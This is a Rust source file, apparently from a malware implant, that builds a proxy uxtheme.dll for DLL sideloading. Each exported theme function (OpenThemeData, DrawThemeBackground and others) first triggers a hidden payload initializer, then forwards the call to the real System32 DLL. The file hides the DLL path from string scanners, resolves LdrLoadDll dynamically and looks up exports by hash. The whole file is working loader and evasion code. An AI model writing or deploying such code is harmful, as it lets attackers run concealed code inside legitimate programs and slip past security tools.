use winapi::ctypes::c_void;
use std::sync::atomic::{AtomicPtr, Ordering};
use std::ptr;

#[cfg(feature = "proxy_uxtheme")]
mod uxtheme_proxy {
    use super::*;
    use crate::ensure_payload_initialized;

    static FN_OPEN_THEME_DATA: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
    static FN_CLOSE_THEME_DATA: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
    static FN_DRAW_THEME_BACKGROUND: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
    static FN_GET_THEME_COLOR: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
    static FN_IS_THEME_ACTIVE: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
    static FN_IS_APP_THEMED: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());

    static UXTHEME_INIT: std::sync::Once = std::sync::Once::new();

    pub(crate) fn init_real_uxtheme_dll() -> bool {
        UXTHEME_INIT.call_once(|| {
            unsafe {

                let mut path = [0u16; 64];
                let mut i = 0usize;

                macro_rules! push_char {
                    ($c:expr) => {{
                        std::ptr::write_volatile(&mut path[i], $c as u16);
                        i += 1;
                    }};
                }

                push_char!('C'); push_char!(':'); push_char!('\\');
                push_char!('W'); push_char!('i'); push_char!('n'); push_char!('d'); push_char!('o'); push_char!('w'); push_char!('s'); push_char!('\\');
                push_char!('S'); push_char!('y'); push_char!('s'); push_char!('t'); push_char!('e'); push_char!('m'); push_char!('3'); push_char!('2'); push_char!('\\');
                push_char!('u'); push_char!('x'); push_char!('t'); push_char!('h'); push_char!('e'); push_char!('m'); push_char!('e'); push_char!('.');
                push_char!('d'); push_char!('l'); push_char!('l'); push_char!(0u16);

                let path_len = i;

                type LdrLoadDllFn = unsafe extern "system" fn(
                    *const u16, *const u32, *const crate::resolver::UNICODE_STRING, *mut *mut c_void
                ) -> i32;

                if let Some(ldr) = crate::resolver::resolve_ldr_load_dll() {
                    let ldr_fn: LdrLoadDllFn = std::mem::transmute(ldr);

                    let us = crate::resolver::UNICODE_STRING {
                        Length: ((path_len - 1) * 2) as u16,
                        MaximumLength: (path_len * 2) as u16,
                        Buffer: path.as_ptr() as *mut u16,
                    };

                    let mut handle: *mut c_void = ptr::null_mut();
                    let status = ldr_fn(ptr::null(), ptr::null(), &us, &mut handle);

                    if status >= 0 && !handle.is_null() {

                        let h = handle as usize;

                        if let Some(f) = crate::hash::get_export_by_hash(h, crate::hash::fnv1a_hash(b"OpenThemeData")) {
                            FN_OPEN_THEME_DATA.store(f as *mut c_void, Ordering::Release);
                        }
                        if let Some(f) = crate::hash::get_export_by_hash(h, crate::hash::fnv1a_hash(b"CloseThemeData")) {
                            FN_CLOSE_THEME_DATA.store(f as *mut c_void, Ordering::Release);
                        }
                        if let Some(f) = crate::hash::get_export_by_hash(h, crate::hash::fnv1a_hash(b"DrawThemeBackground")) {
                            FN_DRAW_THEME_BACKGROUND.store(f as *mut c_void, Ordering::Release);
                        }
                        if let Some(f) = crate::hash::get_export_by_hash(h, crate::hash::fnv1a_hash(b"GetThemeColor")) {
                            FN_GET_THEME_COLOR.store(f as *mut c_void, Ordering::Release);
                        }
                        if let Some(f) = crate::hash::get_export_by_hash(h, crate::hash::fnv1a_hash(b"IsThemeActive")) {
                            FN_IS_THEME_ACTIVE.store(f as *mut c_void, Ordering::Release);
                        }
                        if let Some(f) = crate::hash::get_export_by_hash(h, crate::hash::fnv1a_hash(b"IsAppThemed")) {
                            FN_IS_APP_THEMED.store(f as *mut c_void, Ordering::Release);
                        }
                    }
                }
            }
        });

        !FN_OPEN_THEME_DATA.load(Ordering::Acquire).is_null()
    }

    type OpenThemeDataFn = unsafe extern "system" fn(*mut c_void, *const u16) -> *mut c_void;
    type CloseThemeDataFn = unsafe extern "system" fn(*mut c_void) -> i32;
    type DrawThemeBackgroundFn = unsafe extern "system" fn(*mut c_void, *mut c_void, i32, i32, *const c_void, *const c_void) -> i32;
    type GetThemeColorFn = unsafe extern "system" fn(*mut c_void, i32, i32, i32, *mut u32) -> i32;
    type IsThemeActiveFn = unsafe extern "system" fn() -> i32;
    type IsAppThemedFn = unsafe extern "system" fn() -> i32;

    #[no_mangle]
    pub unsafe extern "system" fn OpenThemeData(
        hwnd: *mut c_void,
        psz_class_list: *const u16,
    ) -> *mut c_void {
        ensure_payload_initialized();
        init_real_uxtheme_dll();

        let f = FN_OPEN_THEME_DATA.load(Ordering::Acquire);
        if !f.is_null() {
            let real_fn: OpenThemeDataFn = std::mem::transmute(f);
            return real_fn(hwnd, psz_class_list);
        }

        ptr::null_mut()
    }

    #[no_mangle]
    pub unsafe extern "system" fn CloseThemeData(htheme: *mut c_void) -> i32 {
        ensure_payload_initialized();
        init_real_uxtheme_dll();

        let f = FN_CLOSE_THEME_DATA.load(Ordering::Acquire);
        if !f.is_null() {
            let real_fn: CloseThemeDataFn = std::mem::transmute(f);
            return real_fn(htheme);
        }

        0
    }

    #[no_mangle]
    pub unsafe extern "system" fn DrawThemeBackground(
        htheme: *mut c_void,
        hdc: *mut c_void,
        i_part_id: i32,
        i_state_id: i32,
        p_rect: *const c_void,
        p_clip_rect: *const c_void,
    ) -> i32 {
        ensure_payload_initialized();
        init_real_uxtheme_dll();

        let f = FN_DRAW_THEME_BACKGROUND.load(Ordering::Acquire);
        if !f.is_null() {
            let real_fn: DrawThemeBackgroundFn = std::mem::transmute(f);
            return real_fn(htheme, hdc, i_part_id, i_state_id, p_rect, p_clip_rect);
        }

        0
    }

    #[no_mangle]
    pub unsafe extern "system" fn GetThemeColor(
        htheme: *mut c_void,
        i_part_id: i32,
        i_state_id: i32,
        i_prop_id: i32,
        p_color: *mut u32,
    ) -> i32 {
        ensure_payload_initialized();
        init_real_uxtheme_dll();

        let f = FN_GET_THEME_COLOR.load(Ordering::Acquire);
        if !f.is_null() {
            let real_fn: GetThemeColorFn = std::mem::transmute(f);
            return real_fn(htheme, i_part_id, i_state_id, i_prop_id, p_color);
        }

        -2147467259
    }

    #[no_mangle]
    pub unsafe extern "system" fn IsThemeActive() -> i32 {
        ensure_payload_initialized();
        init_real_uxtheme_dll();

        let f = FN_IS_THEME_ACTIVE.load(Ordering::Acquire);
        if !f.is_null() {
            let real_fn: IsThemeActiveFn = std::mem::transmute(f);
            return real_fn();
        }

        1
    }

    #[no_mangle]
    pub unsafe extern "system" fn IsAppThemed() -> i32 {
        ensure_payload_initialized();
        init_real_uxtheme_dll();

        let f = FN_IS_APP_THEMED.load(Ordering::Acquire);
        if !f.is_null() {
            let real_fn: IsAppThemedFn = std::mem::transmute(f);
            return real_fn();
        }

        1
    }
}

#[cfg(feature = "proxy_uxtheme")]
pub use uxtheme_proxy::*;

pub(crate) fn init_proxy_dll() -> bool {
    #[cfg(feature = "proxy_uxtheme")]
    {
        return uxtheme_proxy::init_real_uxtheme_dll();
    }

    #[cfg(not(feature = "proxy_uxtheme"))]
    {

        true
    }
}

